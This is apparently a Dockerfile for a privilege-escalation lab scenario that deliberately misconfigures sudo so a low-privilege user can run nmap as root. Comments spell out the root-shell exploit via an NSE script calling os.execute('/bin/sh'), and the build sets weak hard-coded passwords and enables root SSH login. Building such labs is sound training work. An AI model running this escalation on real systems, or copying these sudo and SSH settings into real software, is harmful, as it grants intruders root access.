FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_nmap
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/nmap as root
# Exploit: nmap --interactive then !sh (works on older nmap versions)
#          OR: echo 'os.execute("/bin/sh")' > /tmp/x.nse && sudo nmap --script=/tmp/x.nse
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and nmap
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        nmap \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify nmap is installed
RUN which nmap && ls -la /usr/bin/nmap

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# nmap can execute OS commands via NSE (Nmap Scripting Engine) scripts.
# Exploit approach (modern nmap without --interactive):
#   echo 'os.execute("/bin/sh")' > /tmp/shell.nse
#   sudo nmap --script=/tmp/shell.nse
# Or on older nmap versions: sudo nmap --interactive -> !sh
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/nmap" > /etc/sudoers.d/nmap && \
    chmod 440 /etc/sudoers.d/nmap

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]